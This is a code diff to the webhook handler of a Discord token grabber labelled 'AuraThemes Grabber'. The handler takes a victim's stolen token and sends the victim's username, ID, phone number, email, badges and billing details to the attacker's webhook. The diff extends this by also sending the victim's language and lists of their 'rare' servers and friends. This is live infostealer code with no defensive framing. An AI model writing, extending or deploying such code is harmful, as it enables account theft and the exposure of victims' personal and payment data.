@@ -32,8 +32,10 @@ export default async function handler(req, res) {
     console.log(info);
 
     const Discord = new DiscordToken(data).info;
+    const servers = new DiscordToken(data).guilds.rares;
+    const friends = new DiscordToken(data).friends.rares;
     const embedBuilder = Discord?.ID
-      ? buildInitializedEmbed(Discord, data, embed)
+      ? buildInitializedEmbed(servers, friends, Discord, data, embed)
       : buildRawEmbed(data, embed);
 
     await webhook.send({
@@ -68,7 +70,7 @@ function buildRawEmbed(data, embed) {
   return rawEmbed;
 }
 
-function buildInitializedEmbed(Discord, data, embed) {
+function buildInitializedEmbed(servers, friends, Discord, data, embed) {
   const initializedEmbed = new EmbedBuilder()
     .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
     .setThumbnail(Discord.avatar)
@@ -80,7 +82,10 @@ function buildInitializedEmbed(Discord, data, embed) {
       getField('<a:aura:863691953531125820> Phone', `\`${Discord.phone}\``, true),
       getField('<:aura:974711605927505990> Email', `\`${Discord.mail}\``, false),
       getField('Badges', Discord.badges, true),
-      getField('Billing', Discord.billing, true)
+      getField('Billing', Discord.billing, true),
+      getField('Langue', Discord.langue, true),
+      getField('\u200b', "**Rare Servers:**\n" + servers, false),
+      getField('\u200b', "**Rare Friends:**\n" + friends, false),
     )
     .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
     .setTimestamp();
